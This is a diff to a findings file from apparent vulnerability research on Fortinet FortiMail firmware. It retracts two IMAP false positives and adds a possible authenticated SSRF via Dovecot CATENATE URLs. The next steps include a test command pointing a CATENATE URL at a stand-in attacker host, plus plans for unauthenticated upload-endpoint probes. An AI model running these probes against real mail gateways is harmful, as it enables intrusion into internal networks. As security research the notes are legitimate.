@@ -199,11 +199,15 @@ FMLB_F02_DOVECOT_2212 = {
         "score":   0.471,
         "profile": "mime_parser_overflow",
         "calls":   ["imap_arg_get_atom", "strcasecmp", "imap_arg_get_astring", "imap_msgpart_url_parse"],
-        "note": (
-            "imap_arg_get_astring processes IMAP string literals including {NNN} size-prefixed "
-            "literals. imap_msgpart_url_parse parses IMAP section URLs (e.g. from FETCH BODY[...]). "
-            "Both functions are accessible in the UNAUTHENTICATED IMAP state. "
-            "Score 0.471 is the highest semantic candidate in this sweep."
+        "manual_re_status": "FALSE POSITIVE -- see FMLB-F08 for manual RE conclusions",
+        "false_positive_reason": (
+            "0x121a5 and 0x121ab are NOT independent function starts. "
+            "Both are mid-instruction false matches: 0x121a5 is the second byte of "
+            "'push %r13' (opcode 41 55) and 0x121ab is 'push %rbp' (0x55) mid-prologue. "
+            "The sweep's prologue heuristic hit the 0x55 byte misaligned in the register-save "
+            "sequence of the containing function at 0x121a0. "
+            "The actual function (0x121a0) handles IMAP CATENATE URL sub-commands -- "
+            "APPEND/CATENATE requires AUTHENTICATED state; not a pre-auth attack surface."
         ),
     },
 
@@ -497,6 +501,74 @@ FMLB_F07_HTTPD_INT_OVERFLOW = {
 
 
 # ---------------------------------------------------------
+# FMLB-F08: imap 0x121a0 manual RE -- CATENATE URL handler (authenticated)
+# ---------------------------------------------------------
+FMLB_F08_IMAP_CATENATE_MANUAL_RE = {
+    "id":       "FMLB-F08",
+    "product":  "Fortinet FortiMail imap (Dovecot 2.2.12)",
+    "cve":      None,
+    "severity": "LOW -- authenticated path; potential SSRF via IMAP URL; not pre-auth",
+    "class":    "Authenticated SSRF (potential) via IMAP CATENATE URL sub-command",
+    "affected": "FortiMail 8.0.0 build0183",
+    "status":   "FALSE POSITIVE for pre-auth classification; see SSRF note for residual surface",
+
+    "sweep_candidates_retracted": ["0x121a5 (score 0.471)", "0x121ab (score 0.467)"],
+    "false_positive_reason": (
+        "Prologue heuristic matched byte 0x55 mid-instruction at both VAs. "
+        "0x121a5 = second byte of 'push %r13' (opcode 41 55). "
+        "0x121ab = 'push %rbp' (0x55) in the middle of a 6-register callee-save sequence. "
+        "Neither is a function start. Same class of FP as FSAB-F07."
+    ),
+
+    "actual_function": {
+        "va":         "0x121a0",
+        "description": "IMAP CATENATE URL sub-command handler (RFC 4469)",
+        "disasm_flow": [
+            "0x121a0: prologue (push r15/r14/r13/r12/rbp/rbx, sub 0x88)",
+            "0x121e8: imap_arg_get_atom(arg_list, &atom) -- get sub-command keyword",
+            "0x12201: strcasecmp(atom, 'URL') -- check if sub-command is URL",
+            "0x1221a: imap_arg_get_astring(arg_list, &url_str) -- read URL from client",
+            "0x1222c: testb $0x8, 0x64(%rbx) -- mailbox state limit check (NOT auth check)",
+            "0x1225b: imap_msgpart_url_parse(ns, mailbox, url_str, &out, &istream) -- parse URL",
+            "0x12260: js 0x124ba (error path), je 0x12464 (URL references empty part)",
+            "0x12282: imap_msgpart_url_read_part(url, &istream, &size) -- read message part via URL",
+            "0x122a3: jb 0x12515 -- unsigned overflow check on physical_size + read_bytes",
+            "0x122b6: i_stream_chain_append + i_stream_read + mailbox_save_continue -- stream into mailbox",
+        ],
+        "second_branch": {
+            "va":    "0x12393",
+            "note":  "Second strcasecmp at 0x12398 against string at 0x3865e -- probably 'TEXT' (the other CATENATE sub-command type)",
+        },
+    },
+
+    "auth_requirement": (
+        "IMAP APPEND is only available in AUTHENTICATED or SELECTED state (RFC 3501 s6.3.11). "
+        "CATENATE (RFC 4469) is an APPEND extension. The Dovecot login process enforces state "
+        "transitions; this code path cannot be reached without a valid LOGIN/AUTHENTICATE. "
+        "NOT a pre-auth attack surface."
+    ),
+
+    "residual_ssrf": (
+        "imap_msgpart_url_parse accepts a full IMAP URL including a server component "
+        "(imap://server/mailbox/uid=N/section). If Dovecot 2.2.12 resolves remote server "
+        "references, a crafted CATENATE URL could trigger an outbound IMAP connection "
+        "from the FortiMail server -- authenticated SSRF. "
+        "FortiMail is a mail gateway that may have internal network access (quarantine systems, "
+        "mail stores, Active Directory). SSRF from FortiMail would reach those systems. "
+        "Requires verification: does Dovecot 2.2.12 support IMAP URLAUTH (RFC 4467) "
+        "which enables cross-server URL resolution?"
+    ),
+
+    "next_steps": [
+        "Check Dovecot 2.2.12 configure options: grep for URLAUTH / imap_urlauth in source",
+        "Verify 'TEXT' sub-command at 0x12393 -- likely simpler (literal append, no URL parsing)",
+        "Test authenticated CATENATE with remote URL: APPEND mailbox CATENATE (URL imap://attacker/a/1)",
+        "Pivot to smtpd 0xdefa8 (next highest-priority unconfirmed candidate)",
+    ],
+}
+
+
+# ---------------------------------------------------------
 # Semantic sweep summary
 # ---------------------------------------------------------
 FML_SEMANTIC_SWEEP_SUMMARY = {
@@ -522,15 +594,22 @@ FML_SEMANTIC_SWEEP_SUMMARY = {
         "CVE-2022-39952 (upload path traversal) appears patched in 8.0.0 (FMLB-F03)",
         "adminfileupload FastCGI: no Apache auth; auth in libuploadbase.so (FMLB-F04)",
         "Hardcoded RSA key (fgt_2048.key) -- same as FortiGate key leak 2012 (FMLB-F01)",
-        "imap 0x121a5 (mime_parser_overflow, 0.471): Dovecot MIME URL parse path (FMLB-F02 candidate)",
+        "imap 0x121a5/0x121ab: FALSE POSITIVE -- mid-prologue 0x55 byte; real function=CATENATE handler (FMLB-F08)",
         "smtpd 0xdefa8: direct strcpy call needs manual verification (FMLB-F05)",
+        "FMLB-F08 residual: authenticated SSRF via CATENATE URL if Dovecot 2.2.12 supports URLAUTH",
+    ],
+
+    "false_positives_confirmed": [
+        "imap 0x121a5 (mime_parser_overflow, 0.471): mid-instruction 0x55 byte in push-r13; see FMLB-F08",
+        "imap 0x121ab (mime_parser_overflow, 0.467): push-rbp in middle of callee-save sequence; see FMLB-F08",
     ],
 
     "priority_order": [
         "1. FMLB-F02: Confirm Dovecot CVE versions applicable (2.2.12 -> check each CVE scope)",
         "2. FMLB-F04: Live test /module/adminfileupload with no auth cookie",
         "3. FMLB-F05: Manual disasm smtpd 0xdefa8 + 0xa99e3 for pre-auth SMTP overflow",
-        "4. FMLB-F06: nm mailfilterd at 0x131362 + manual disasm for MIME/archive path",
-        "5. FMLB-F07: httpd 0x85500 manual disasm (watch for false positive)",
+        "4. FMLB-F08: SSRF test -- APPEND CATENATE (URL imap://attacker/) as authenticated user",
+        "5. FMLB-F06: nm mailfilterd at 0x131362 + manual disasm for MIME/archive path",
+        "6. FMLB-F07: httpd 0x85500 manual disasm (watch for false positive)",
     ],
 }
